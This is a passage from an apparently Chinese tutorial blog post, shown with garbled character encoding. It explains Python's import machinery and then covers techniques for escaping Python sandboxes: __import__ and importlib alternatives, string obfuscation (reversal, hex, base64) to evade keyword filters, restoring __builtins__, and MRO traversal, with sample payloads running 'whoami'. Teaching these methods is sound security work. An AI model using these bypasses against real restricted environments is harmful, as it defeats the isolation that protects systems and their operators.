åº”è¯¥åœ¨æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ï¼ˆ<code>module.__dict__</code>ï¼‰ä¸­æ‰§è¡Œæ¨¡å—ä»£ç ã€‚</li><li>å¦‚æœ loader ä¸èƒ½æ‰§è¡Œæ¨¡å—ï¼Œåº”è¯¥æŠ›å‡º <code>ImportError</code> å¼‚å¸¸ã€‚</li></ul><p>Python 3.4 çš„ä¸¤ä¸ªå˜åŒ–ï¼š</p><ol><li>loader æä¾› create_module() æ¥åˆ›å»º module å¯¹è±¡ï¼ˆæ¥å—ä¸€ä¸ª module spec object å¹¶è¿”å› module objectï¼‰ã€‚å¦‚æœè¿”å› None ï¼Œåˆ™ç”±å¯¼å…¥æœºåˆ¶è‡ªè¡Œåˆ›å»ºæ¨¡å—ã€‚å› ä¸º module å¯¹è±¡åœ¨æ¨¡å—æ‰§è¡Œå‰å¿…é¡»å­˜åœ¨ sys.modules ä¸­ã€‚</li><li>load_module() æ–¹æ³•è¢« exec_module() æ–¹æ³•æ›¿ä»£ï¼Œä¸ºäº†å‘å‰å…¼å®¹ï¼Œå¦‚æœå­˜åœ¨ load_module() ä¸”æœªå®ç° exec_moduleï¼Œ å¯¼å…¥æœºåˆ¶æ‰ä¼šä½¿ç”¨ load_module() æ–¹æ³•ã€‚</li></ol><h3 id="module-spec-å¯¹è±¡"><a href="#module-spec-å¯¹è±¡" class="headerlink" title="module spec å¯¹è±¡"></a><strong>module</strong> <strong>spec</strong> <strong>å¯¹è±¡</strong></h3><p>module spec ä¸»è¦æœ‰ä¸¤ä¸ªä½œç”¨ï¼š</p><ol><li>ä¼ é€’ â€”â€” å¯ä»¥åœ¨å¯¼å…¥ç³»ç»Ÿçš„ä¸åŒç»„ä»¶ï¼Œå¦‚ finder å’Œ loader ä¹‹é—´ä¼ é€’çŠ¶æ€ä¿¡æ¯</li><li>æ¨¡æ¿(boilerplate)æ„å»º â€”â€” å¯¼å…¥æœºåˆ¶å¯ä»¥æ ¹æ® module spec æ‰§è¡Œæ¨¡æ¿åŠ è½½æ“ä½œï¼Œæ²¡æœ‰ module spec åˆ™ loader éœ€è¦è´Ÿè´£å®Œæˆè¿™ä¸ªå·¥ä½œã€‚</li></ol><p>module spec é€šè¿‡ module å¯¹è±¡çš„ <strong>spec</strong> å±æ€§å¾—ä»¥å…¬å¼€ï¼Œå¯ä»¥æŸ¥çœ‹ <em>ModuleSpec</em> è·å–æ›´å¤šä¿¡æ¯ã€‚</p><pre class="language-none"><code class="language-none"> import requestsrequests.__spec__ModuleSpec(name='requests', loader=&lt;_frozen_importlib_external.SourceFileLoader object at 0x000002EE4EBBF7B8&gt;, origin='C:\\Python37\\lib\\site-packages\\requests\\__init__.py', submodule_search_locations=['C:\\Python37\\lib\\site-packages\\requests'])</code></pre><p>åœ¨ <code>_init_module_attrs</code> æ­¥éª¤ä¸­ï¼Œå¯¼å…¥æœºåˆ¶ä¼šæ ¹æ® module spec å¡«å…… module å¯¹è±¡ï¼ˆè¿™ä¸ªè¿‡ç¨‹å‘ç”Ÿåœ¨ loader æ‰§è¡Œæ¨¡å—ä¹‹å‰ï¼‰</p><table><thead><tr><th><strong>å±æ€§</strong></th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>name</strong></td><td>æ¨¡å—çš„å®Œå…¨é™å®šå</td></tr><tr><td><strong>loader</strong></td><td>æ¨¡å—åŠ è½½æ—¶ä½¿ç”¨çš„ loader å¯¹è±¡ï¼Œä¸»è¦æ˜¯ç”¨äºå†…çœ</td></tr><tr><td><strong>package</strong></td><td>å–ä»£ <code>__name__</code> ç”¨äºå¤„ç†ç›¸å¯¹å¯¼å…¥ï¼Œå¿…é¡»è®¾ç½®ï¼å½“å¯¼å…¥åŒ…æ—¶ï¼Œè¿™ä¸ªå€¼å’Œ <code>__name__</code> ç›¸åŒï¼›å½“å¯¼å…¥å­åŒ…æ—¶ï¼Œåˆ™ä¸ºå…¶çˆ¶åŒ…åï¼›ä¸ºé¡¶çº§æ¨¡å—æ—¶ï¼Œåº”è¯¥ä¸ºç©ºå­—ç¬¦ä¸²</td></tr><tr><td><strong>spec</strong></td><td>å¯¼å…¥æ—¶è¦ä½¿ç”¨çš„ module spec å¯¹è±¡</td></tr><tr><td><strong>path</strong></td><td>å¦‚æœæ¨¡å—ä¸ºåŒ…ï¼Œåˆ™å¿…é¡»è®¾ç½®ï¼è¿™ä¸ªå€¼ä¸ºå¯è¿­ä»£å¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰è¿›ä¸€æ­¥ç”¨é€”ï¼Œå¯ä»¥ä¸ºç©ºï¼Œå¦åˆ™è¿­ä»£ç»“æœåº”è¯¥ä¸ºå­—ç¬¦ä¸²</td></tr><tr><td><strong>file</strong></td><td>å¯é€‰å€¼ï¼Œåªæœ‰å†…ç½®æ¨¡å—å¯ä»¥ä¸è®¾ç½® <code>__file__</code> å±æ€§</td></tr><tr><td><strong>cached</strong></td><td>ä¸ºç¼–è¯‘åå­—èŠ‚ç æ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼Œå®ƒå’Œ <code>__file__</code> çš„å­˜åœ¨äº’ä¸å½±å“</td></tr></tbody></table><blockquote><p>åœ¨å‘½åç©ºé—´åŒ…å‡ºæ¥ä¹‹å‰ï¼Œå¦‚æœæƒ³å®ç°å‘½åç©ºé—´åŒ…åŠŸèƒ½ï¼Œä¸€èˆ¬æ˜¯åœ¨åŒ…çš„ <code>__init__.py</code> ä¸­ä¿®æ”¹å…¶ <code>__path__</code> å±æ€§ã€‚éšç€ PEP420 çš„å¼•å…¥ï¼Œå‘½åç©ºé—´åŒ…å·²ç»å¯ä»¥ä¸éœ€è¦ <code>__init__.py</code> çš„è¿™ç§æ“ä½œäº†ã€‚</p></blockquote><h3 id="path-based-finder-åŸºäºå…ƒè·¯å¾„æŸ¥æ‰¾å™¨"><a href="#path-based-finder-åŸºäºå…ƒè·¯å¾„æŸ¥æ‰¾å™¨" class="headerlink" title="path-based-finder åŸºäºå…ƒè·¯å¾„æŸ¥æ‰¾å™¨"></a><strong>path-based-finder åŸºäºå…ƒè·¯å¾„æŸ¥æ‰¾å™¨</strong></h3><p>ä¸Šæ–‡å·²ç»æåˆ°è¿‡ï¼ŒPython é»˜è®¤è‡ªå¸¦äº†å‡ ä¸ª meta path çš„ finder ï¼Œå…¶ä¸­ä¹‹ä¸€å°±æ˜¯ <strong>PathBasedFinder</strong> ï¼Œå®ƒè´Ÿè´£æœç´¢ <em>import path</em> ä¸Šçš„è·¯å¾„ã€‚</p><p>è¿™ä¸ª finder å®é™…ä¸Šå¹¶ä¸çŸ¥é“å¦‚ä½•è¿›è¡Œ import ï¼Œå®ƒçš„å·¥ä½œåªæ˜¯éå† <em>import path</em> ä¸Šçš„æ¯ä¸€ä¸ªæ¡ç›®ï¼Œå°†å®ƒä»¬å…³è”åˆ°æŸä¸ªçŸ¥é“å¦‚ä½•å¤„ç†ç‰¹å®šç±»å‹è·¯å¾„çš„ <strong>path entry finder</strong>ï¼ˆè·¯å¾„æ¡ç›®æŸ¥æ‰¾å™¨ï¼‰ã€‚</p><blockquote><p>æ ¹æ®æœ¯è¯­è¡¨ï¼Œ<strong>path entry</strong> <strong>finder</strong> æ˜¯ç”± <code>sys.path_hook</code> åˆ—è¡¨ä¸­çš„å¯è°ƒç”¨å¯¹è±¡è¿”å›çš„ï¼ˆå‰ææ˜¯å®ƒçŸ¥é“å¦‚ä½•æ ¹æ®ç‰¹å®šè·¯å¾„æ¡ç›®æ‰¾åˆ°æ¨¡å—ï¼‰ã€‚</p></blockquote><p>å¯ä»¥å°† <em>PathEntryFinder</em> çœ‹ä½œ <em>PathBasedFinder</em> çš„å…·ä½“å®ç°ã€‚å®é™…ä¸Šï¼Œå¦‚æœä» <code>sys.meta_path</code> ä¸­ç§»é™¤äº† <em>PathBasedFinder</em> ï¼Œåˆ™ä¸ä¼šæœ‰ä»»ä½• <em>PathEntryFinder</em> è¢«è°ƒç”¨ã€‚</p><h3 id="path-entry-finder-è·¯å¾„æ¡ç›®æŸ¥æ‰¾å™¨"><a href="#path-entry-finder-è·¯å¾„æ¡ç›®æŸ¥æ‰¾å™¨" class="headerlink" title="path entry finder è·¯å¾„æ¡ç›®æŸ¥æ‰¾å™¨"></a><strong>path entry</strong> <strong>finder</strong> <strong>è·¯å¾„æ¡ç›®æŸ¥æ‰¾å™¨</strong></h3><p><em>PathBasedFinder</em> ä¼šä½¿ç”¨åˆ°ä¸‰ä¸ªå˜é‡ï¼Œå®ƒä»¬ä¼šæä¾›ç»™è‡ªå®šä¹‰å¯¼å…¥æœºåˆ¶çš„é¢å¤–é€”å¾„ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li><code>sys.path</code></li><li><code>sys.path_hooks</code></li><li><code>sys.path_importer_cache</code></li></ul><blockquote><p>åŒ…çš„ <strong>path</strong> å±æ€§ä¹Ÿä¼šè¢«ä½¿ç”¨ã€‚</p></blockquote><p><code>sys.path</code> æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œæä¾›äº†æ¨¡å—å’ŒåŒ…çš„æœç´¢ä½ç½®ã€‚å®ƒçš„æ¡ç›®å¯ä»¥æ¥è‡ªäºæ–‡ä»¶ç³»ç»Ÿçš„ç›®å½•ã€zip æ–‡ä»¶æˆ–è€…å…¶ä»–æ½œåœ¨å¯ä»¥æ‰¾åˆ°æ¨¡å—çš„â€œä½ç½®â€ï¼ˆå‚è€ƒ <code>site</code> æ¨¡å—ï¼‰ã€‚</p><p>ç”±äº <em>PathBasedFinder</em> æ˜¯ä¸€ä¸ª <em>meta path</em> <em>finder</em> ï¼Œæ‰€ä»¥å¿…é¡»å®ç°äº† <code>find_spec()</code> æ–¹æ³•ã€‚å¯¼å…¥æœºåˆ¶ä¼šé€šè¿‡è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ¥æœç´¢ <em>import path</em> ï¼ˆé€šè¿‡ä¼ å…¥ <code>path</code> å‚æ•° â€”â€” å®ƒæ˜¯ä¸€ä¸ªå¯éå†çš„å­—ç¬¦ä¸²åˆ—è¡¨ï¼‰ã€‚</p><p>åœ¨ <code>find_spec()</code> å†…éƒ¨ï¼Œä¼šè¿­ä»£ path çš„æ¯ä¸ªæ¡ç›®ï¼Œå¹¶ä¸”æ¯æ¬¡éƒ½æŸ¥æ‰¾ä¸æ¡ç›®ç›¸å¯¹åº”çš„ <em>PathEntryFinder</em>ã€‚ä½†ç”±äºè¿™ä¸ªæ“ä½œä¼šå¾ˆè€—èµ„æºï¼Œå› æ­¤ <em>PathBasedFinder</em> ä¼šç»´æŒä¸€ä¸ªç¼“å­˜ â€”â€” <code>sys.path_importer_caceh</code> æ¥å­˜æ”¾è·¯å¾„æ¡ç›®åˆ° finder ä¹‹é—´çš„æ˜ å°„ï¼ˆè™½ç„¶æ˜¯è¿™æ ·å­å‘½åï¼Œä½†å®ƒå­˜æ”¾çš„ç¡®å®æ˜¯ finder å¯¹è±¡è€Œä¸æ˜¯ importer å¯¹è±¡ï¼‰ã€‚é‚£ä¹ˆåªè¦æ¡ç›®æ‰¾åˆ°è¿‡ä¸€æ¬¡ finder å°±ä¸ä¼šé‡æ–°å†åŒ¹é…ï¼ˆä½ å¯ä»¥æ‰‹åŠ¨ç§»é™¤ç¼“å­˜æ¡ç›®æ¥è¾¾åˆ°å†æ¬¡å¼ºåˆ¶åŒ¹é…çš„ç›®çš„ï¼‰ã€‚</p><p>å¦‚æœç¼“å­˜ä¸­æ²¡æœ‰å¯¹åº”è·¯å¾„æ¡ç›®çš„é”®ï¼Œåˆ™ä¼šè¿­ä»£ <code>sys.path_hooks</code> ä¸­çš„æ¯ä¸ª å¯è°ƒç”¨å¯¹è±¡ã€‚è¿™äº›å¯è°ƒç”¨å¯¹è±¡éƒ½æ¥å—ä¸€ä¸ª <code>path</code> å‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ª <em>PathEntryFinder</em> æˆ–è€…æŠ›å‡º <code>ImportError</code> å¼‚å¸¸ã€‚</p><p>å¦‚æœéå†å®Œæ•´ä¸ª <code>sys.path_hooks</code> çš„å¯è°ƒç”¨å¯¹è±¡éƒ½æ²¡æœ‰è¿”å› <em>PathEntryFinder</em>ï¼Œåˆ™ <code>find_spec()</code> æ–¹æ³•ä¼šåœ¨ <code>sys.path_importer_cache</code> ä¸­å­˜å…¥ <code>None</code> å¹¶è¿”å› <code>None</code> ï¼Œè¡¨ç¤º <em>PathBasedFinder</em> æ— æ³•æ‰¾åˆ°è¯¥æ¨¡å—ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>pythonå¯åŠ¨æ—¶é»˜è®¤åˆå§‹åŒ–èƒ½å¾—åˆ°çš„:</p><ul><li>sys.modules : ä¸€ä¸ªå­˜æ”¾äº†æ›¾ç»å¯¼å…¥çš„æ¨¡å—(ä¹ŸåŒ…æ‹¬ä¸€äº›å†…ç½®æ¨¡å—)çš„å­—å…¸(ç¼“å­˜)</li><li>sys.path ï¼šåˆå§‹åŒ–çš„è·¯å¾„(åŒ…æ‹¬é¡¹ç›®è·¯å¾„ï¼Œç³»ç»ŸPATHè·¯å¾„ï¼ŒPythonå®‰è£…çš„è·¯å¾„)</li></ul><p>å½“éœ€è¦importä¸€ä¸ªæ¨¡å—æ—¶ï¼Œä¸»è¦åˆ†ä¸ºæŸ¥æ‰¾å’ŒåŠ è½½ä¸¤æ­¥</p><ul><li>æŸ¥æ‰¾ï¼šé¦–å…ˆåœ¨sys.modulesä¸­æŸ¥æ‰¾ï¼Œè‹¥æœªæŸ¥æ‰¾åˆ°ï¼Œåˆ™è§¦å‘ç›¸åº”æŸ¥æ‰¾æœºåˆ¶ï¼Œé€šè¿‡å†…ç½®çš„finderæŸ¥æ‰¾å™¨åœ¨å·²ç»åˆå§‹åŒ–å¥½ï¼ˆsys.path;meta_pathï¼‰çš„è·¯å¾„ä¸‹å¯»æ‰¾æ¨¡å—,è‹¥æ‰¾åˆ°åˆ™ä¼šè¿”å›ä¸€ä¸ª <code>spec</code> å¯¹è±¡ï¼Œå¦åˆ™æŠ›å‡ºä¸èƒ½æ‰¾åˆ°æ¨¡å—çš„å¼‚å¸¸</li><li>åŠ è½½ï¼šé¦–å…ˆä¼šå°†æ¨¡å—ä¿¡æ¯ç¼“å­˜åœ¨sys.modulesä¸­ï¼Œå¦‚æœåŠ è½½å¤±è´¥ï¼Œé‚£ä¹ˆå¤±è´¥çš„æ¨¡å—ä¼šä» <code>sys.modules</code> ä¸­è¢«ç§»é™¤ï¼Œç„¶ååˆ›å»ºmoduleå¯¹è±¡ï¼Œåˆ›å»ºç›¸åº”çš„å‘½åç©ºé—´ï¼Œå¹¶å¯¹è¯¥moduleå¯¹è±¡è¿›è¡Œåˆå§‹åŒ–â€“å†™å…¥ä¸€äº›æ¨¡å—å†…ç½®å±æ€§ï¼ˆ__name__ã€__spec__ç­‰ç­‰ï¼‰ç„¶åä¼ é€’moduleå¯¹è±¡ç»™åŠ è½½æ ¸å¿ƒloader,åœ¨æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ï¼ˆmodule.__dict__ï¼‰ä¸­æ‰§è¡Œæ¨¡å—ä»£ç (åˆ›å»ºæ¨¡å—ä»£ç ä¸­ç›¸åº”å¯¹è±¡å’Œæ‰§è¡Œç›¸åº”ä»£ç )ã€‚å¦‚æœ loader ä¸èƒ½æ‰§è¡Œæ¨¡å—ï¼Œåº”è¯¥æŠ›å‡º <code>ImportError</code> å¼‚å¸¸</li></ul><p>åŠ è½½æˆåŠŸåè¿”å›å¯¹åº”moduleå¯¹è±¡èµ‹ç»™import åé¢çš„æ¨¡å—å(å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡asèµ‹äºˆå…¶ä»–åå­—)ï¼Œå¹¶å†™å…¥ç¼“å­˜</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="http://sinhub.cn/2019/05/python-import-machinery-part-one/">http://sinhub.cn/2019/05/python-import-machinery-part-one/</a></p><h1 id="å‘½ä»¤æ‰§è¡Œæ²™ç®±é€ƒé€¸"><a href="#å‘½ä»¤æ‰§è¡Œæ²™ç®±é€ƒé€¸" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ²™ç®±é€ƒé€¸"></a>å‘½ä»¤æ‰§è¡Œæ²™ç®±é€ƒé€¸</h1><h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>ç›´æ¥ç¦ç”¨ <code>import os</code> è‚¯å®šæ˜¯ä¸è¡Œçš„</p><pre class="language-none"><code class="language-none">import  osimport   osimport    os...</code></pre><p>å¦‚æœå¤šä¸ªç©ºæ ¼ä¹Ÿè¿‡æ»¤äº†ï¼ŒPython èƒ½å¤Ÿ import çš„å¯ä¸æ­¢ <code>import</code>ï¼Œè¿˜æœ‰ <code>__import__</code>ï¼š<code>__import__('os')</code>ï¼Œ<code>__import__</code>è¢«å¹²äº†è¿˜æœ‰ <code>importlib</code>ï¼š<code>importlib.import_module('os').system('ls')</code></p><p>importæœ¬è´¨ä¸Šå°±æ˜¯æ‰§è¡Œä¸€éå¯¼å…¥çš„åº“ã€‚è¿™ä¸ªè¿‡ç¨‹å®é™…ä¸Šå¯ä»¥ç”¨ <code>execfile</code> æ¥ä»£æ›¿ï¼ˆpython2ï¼‰ï¼š</p><pre class="language-none"><code class="language-none">execfile('/usr/lib/python2.7/os.py')system('ls')</code></pre><p>ä¹Ÿå¯ä»¥è¿™æ ·ï¼Œæ¯”è¾ƒé€šç”¨</p><pre class="language-none"><code class="language-none">with open('/usr/lib/python3.6/os.py','r') as f:    exec(f.read())system('ls')</code></pre><p>ä¸è¿‡è¦ä½¿ç”¨ä¸Šé¢çš„è¿™ä¸¤ç§æ–¹æ³•ï¼Œå°±å¿…é¡»çŸ¥é“åº“çš„è·¯å¾„ã€‚å…¶å®åœ¨å¤§å¤šæ•°çš„ç¯å¢ƒä¸‹ï¼Œåº“éƒ½æ˜¯é»˜è®¤è·¯å¾„ã€‚å¦‚æœ sys æ²¡è¢«å¹²æ‰çš„è¯ï¼Œè¿˜å¯ä»¥ç¡®è®¤ä¸€ä¸‹</p><pre class="language-none"><code class="language-none">import sysprint(sys.path)</code></pre><p>å¦‚æœå°† os ä» sys.modules ä¸­å‰”é™¤ï¼Œos å°±å½»åº•æ²¡æ³•ç”¨äº†ï¼š</p><p>æ³¨æ„ï¼Œè¿™é‡Œä¸èƒ½ç”¨ <code>del sys.modules['os']</code>ï¼Œå› ä¸ºï¼Œå½“ import ä¸€ä¸ªæ¨¡å—æ—¶ï¼šimport Aï¼Œæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰ Aï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¸º A åˆ›å»º module å¯¹è±¡ï¼Œå¹¶åŠ è½½ Aã€‚</p><p>æ‰€ä»¥åˆ äº† <code>sys.modules['os']</code> åªä¼šè®© Python é‡æ–°åŠ è½½ä¸€æ¬¡ osã€‚</p><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><p>å¯ä»¥é€šè¿‡ <code>getattr</code> æ‹¿åˆ°å¯¹è±¡çš„æ–¹æ³•ã€å±æ€§</p><p>ä¸ <code>getattr</code> ç›¸ä¼¼çš„è¿˜æœ‰ <code>__getattr__</code>ã€<code>__getattribute__</code>ï¼Œå®ƒä»¬è‡ªå·±çš„åŒºåˆ«å°±æ˜¯<code>getattr</code>ç›¸å½“äº<code>class.attr</code>ï¼Œéƒ½æ˜¯è·å–ç±»å±æ€§/æ–¹æ³•çš„ä¸€ç§æ–¹å¼ï¼Œåœ¨è·å–çš„æ—¶å€™ä¼šè§¦å‘<code>__getattribute__</code>ï¼Œå¦‚æœ<code>__getattribute__</code>æ‰¾ä¸åˆ°ï¼Œåˆ™è§¦å‘<code>__getattr__</code></p><pre class="language-none"><code class="language-none">import osgetattr(os, 'metsys'[::-1])('whoami')</code></pre><pre class="language-none"><code class="language-none">&gt;&gt;&gt; getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('whoami')macr0phag30</code></pre><h2 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h2><p>ä»£ç ä¸­è¦æ˜¯å‡ºç° <code>os</code>ï¼Œç›´æ¥ä¸è®©è¿è¡Œã€‚é‚£ä¹ˆå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²çš„å„ç§å˜åŒ–æ¥å¼•å…¥ os</p><p>ä»¥ç¦æ‰oså­—ç¬¦ä¸²ä¸ºä¾‹ï¼š</p><ol><li>å­—ç¬¦ä¸²æ•°ç»„é€†åº</li></ol><pre class="language-none"><code class="language-none">__import__('so'[::-1]).system('ls')</code></pre><ol><li>å­—ç¬¦ä¸²æ‹¼æ¥</li></ol><pre class="language-none"><code class="language-none">b = 'o'a = 's'__import__(a+b).system('ls')</code></pre><ol><li>è¿˜å¯ä»¥åˆ©ç”¨ <code>eval</code> æˆ–è€… <code>exec</code></li></ol><pre class="language-none"><code class="language-none">&gt;&gt;&gt; eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])macr0phag30&gt;&gt;&gt; exec(')"imaohw"(metsys.so ;so tropmi'[::-1])macr0phag3</code></pre><p>evalã€exec éƒ½æ˜¯ç›¸å½“å±é™©çš„å‡½æ•°ï¼Œexec æ¯” eval è¿˜è¦å±é™©</p><p>å¯¹å­—ç¬¦ä¸²çš„å¤„ç†å¯ä»¥æœ‰ï¼šé€†åºã€æ‹¼æ¥ã€base64ã€hexã€rot13â€¦ç­‰ç­‰ï¼Œ</p><pre class="language-none"><code class="language-none">['__builtins__'] ['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'][u'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['X19idWlsdGluc19f'.decode('base64')]['__buil'+'tins__']['__buil''tins__']['__buil'.__add__('tins__')]["_builtins_".join("__")]['%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]...</code></pre><h2 id="builtinsã€builtin-ä¸-builtins"><a href="#builtinsã€builtin-ä¸-builtins" class="headerlink" title="builtinsã€builtin__ä¸__builtins"></a><strong>builtinsã€<strong>builtin__ä¸__builtins</strong></strong></h2><p>åœ¨ Python ä¸­ï¼Œæœ‰å¾ˆå¤šå‡½æ•°ä¸éœ€è¦ä»»ä½• import å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚<code>chr</code>ã€<code>open</code>ã€‚ä¹‹æ‰€ä»¥å¯ä»¥è¿™æ ·ï¼Œæ˜¯å› ä¸º Python æœ‰ä¸ªå«<code>å†…å»ºæ¨¡å—</code>ï¼ˆæˆ–è€…å«å†…å»ºå‘½åç©ºé—´ï¼‰çš„ä¸œè¥¿ï¼Œå®ƒæœ‰ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼Œå˜é‡å’Œç±»ã€‚é¡ºä¾¿è¯´ä¸€ä¸‹ï¼ŒPython å¯¹å‡½æ•°ã€å˜é‡ã€ç±»ç­‰ç­‰çš„æŸ¥æ‰¾æ–¹å¼æ˜¯æŒ‰ <code>LEGB</code> è§„åˆ™æ¥æ‰¾çš„ï¼Œå…¶ä¸­ B å³ä»£è¡¨å†…å»ºæ¨¡å—</p><p>åœ¨ 2.x ç‰ˆæœ¬ä¸­ï¼Œå†…å»ºæ¨¡å—è¢«å‘½åä¸º <code>__builtin__</code>ï¼Œåˆ°äº† 3.x å°±æˆäº† <code>builtins</code>ã€‚å®ƒä»¬éƒ½éœ€è¦ import æ‰èƒ½æŸ¥çœ‹ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; '__import__' in dir(__builtins__)True&gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami')macr0phag30&gt;&gt;&gt; 'eval' in dir(__builtins__)True&gt;&gt;&gt; 'execfile' in dir(__builtins__)True</code></pre><p>è¿™é‡Œç¨å¾®è§£é‡Šä¸‹ <code>x.__dict__</code> ï¼Œå®ƒæ˜¯ x å†…éƒ¨æ‰€æœ‰å±æ€§åå’Œå±æ€§å€¼ç»„æˆçš„å­—å…¸ï¼Œæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><ol><li>å†…ç½®çš„æ•°æ®ç±»å‹æ²¡æœ‰ <strong>dict</strong> å±æ€§</li><li>æ¯ä¸ªç±»æœ‰è‡ªå·±çš„ <strong>dict</strong> å±æ€§ï¼Œå°±ç®—å­˜ç€ç»§æ‰¿å…³ç³»ï¼Œçˆ¶ç±»çš„ <strong>dict</strong> å¹¶ä¸ä¼šå½±å“å­ç±»çš„ <strong>dict</strong></li><li>å¯¹è±¡ä¹Ÿæœ‰è‡ªå·±çš„ <strong>dict</strong> å±æ€§ï¼ŒåŒ…å« <code>self.xxx</code> è¿™ç§å®ä¾‹å±æ€§</li></ol><p>é‚£ä¹ˆæ—¢ç„¶<code>__builtins__</code>æœ‰è¿™ä¹ˆå¤šå±é™©çš„å‡½æ•°ï¼Œä¸å¦‚å°†é‡Œé¢çš„å±é™©å‡½æ•°ç ´åäº†ï¼š</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>reload(__builtins__)</code> æ¥æ¢å¤ <code>__builtins__</code>ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ <code>reload</code> çš„æ—¶å€™ä¹Ÿæ²¡å¯¼å…¥ï¼Œè¯´æ˜ <code>reload</code>ä¹Ÿåœ¨ <code>__builtins__</code>é‡Œï¼Œé‚£å¦‚æœè¿<code>reload</code>éƒ½ä»<code>__builtins__</code>ä¸­åˆ äº†ï¼Œå°±æ²¡æ³•æ¢å¤<code>__builtins__</code>äº†ï¼Œéœ€è¦å¦å¯»ä»–æ³•ã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯åˆ©ç”¨ <code>exec command in _global</code> åŠ¨æ€è¿è¡Œè¯­å¥æ—¶çš„ç»•è¿‡</p><h2 id="é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸"><a href="#é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸" class="headerlink" title="é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸"></a><strong>é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸</strong></h2><p>åœ¨ Python ä¸­æåˆ°ç»§æ‰¿å°±ä¸å¾—ä¸æ <code>mro</code>ï¼Œ<code>mro</code>å°±æ˜¯æ–¹æ³•è§£æé¡ºåºï¼Œå› ä¸º Python æ”¯æŒå¤šé‡ç»§æ‰¿ï¼Œæ‰€ä»¥å°±å¿…é¡»æœ‰ä¸ªæ–¹å¼åˆ¤æ–­æŸä¸ªæ–¹æ³•åˆ°åº•æ˜¯ A çš„è¿˜æ˜¯ B çš„ã€‚2.2 ä¹‹å‰æ˜¯ç»å…¸ç±»ï¼Œæœç´¢æ˜¯æ·±åº¦ä¼˜å…ˆï¼›ç»å…¸ç±»åæ¥å‘å±•ä¸ºæ–°å¼ç±»ï¼Œä½¿ç”¨å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼Œå†åæ¥æ–°å¼ç±»çš„æœç´¢å˜ä¸º C3 ç®—æ³•ï¼›è€Œ 3.x ä¸­æ–°å¼ç±»ä¸€ç»Ÿæ±Ÿæ¹–ï¼Œé»˜è®¤ç»§æ‰¿ <code>object</code>ï¼Œå½“ç„¶ä¹Ÿæ˜¯ä½¿ç”¨çš„ C3 æœç´¢ç®—æ³•ã€‚ã€‚ã€‚æ‰¯è¿œäº†æ‰¯è¿œäº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥æœæœã€‚ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæ€»æ˜¯è®©äººå»åˆ¤æ–­ç»§æ‰¿å…³ç³»æ˜¾ç„¶æ˜¯åäººç±»çš„ï¼Œæ‰€ä»¥ Python ä¸­æ–°å¼ç±»éƒ½æœ‰ä¸ªå±æ€§ï¼Œ<code>.__mro__</code> æˆ– <code>.mro()</code>ï¼Œæ˜¯ä¸ªå…ƒç»„ï¼Œè®°å½•äº†ç»§æ‰¿å…³ç³»ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__(&lt;class 'str'&gt;, &lt;class 'object'&gt;)CEYLON</code></pre><p> ç±»çš„å®ä¾‹åœ¨è·å– <code>__class__</code> å±æ€§æ—¶ä¼šæŒ‡å‘è¯¥å®ä¾‹å¯¹åº”çš„ç±»ã€‚å¯ä»¥çœ‹åˆ°ï¼Œ<code>''</code>å±äº <code>str</code>ç±»ï¼Œå®ƒç»§æ‰¿äº† <code>object</code> ç±»ï¼Œè¿™ä¸ªç±»æ˜¯æ‰€æœ‰ç±»çš„è¶…ç±»ã€‚å…·æœ‰ç›¸åŒåŠŸèƒ½çš„è¿˜æœ‰<code>__base__</code>å’Œ<code>__bases__</code>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç»å…¸ç±»éœ€è¦æŒ‡æ˜ç»§æ‰¿ object æ‰ä¼šç»§æ‰¿å®ƒï¼Œå¦åˆ™æ˜¯ä¸ä¼šç»§æ‰¿çš„ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; class test:...  